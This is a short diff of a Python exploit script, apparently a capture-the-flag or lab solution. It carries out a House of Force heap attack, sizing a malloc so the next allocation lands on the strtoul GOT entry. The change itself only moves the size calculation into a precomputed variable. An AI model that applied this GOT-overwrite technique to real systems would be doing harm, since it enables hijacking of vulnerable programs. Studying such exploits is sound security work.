@@ -114,7 +114,7 @@ print "[*] allocating second HOF chunk with size "+str(hex(int(hof_size_2,16)))
 
 f.write("g\n")
 readuntil(f, ":")
-f.write(format((STRTOUL_GOT-8-(int(heap_base,16)+WILDERNESS_OFFSET))&0xffffffff,'x')+"\n") # specify size of 2nd HOF malloc() to be `GOT_entry - 8 byte - addr of top chunk`
+f.write(hof_size_2+"\n") # specify size of 2nd HOF malloc() to be `GOT_entry - 8 byte - addr of top chunk`
 readuntil(f)
 
 # main_menu
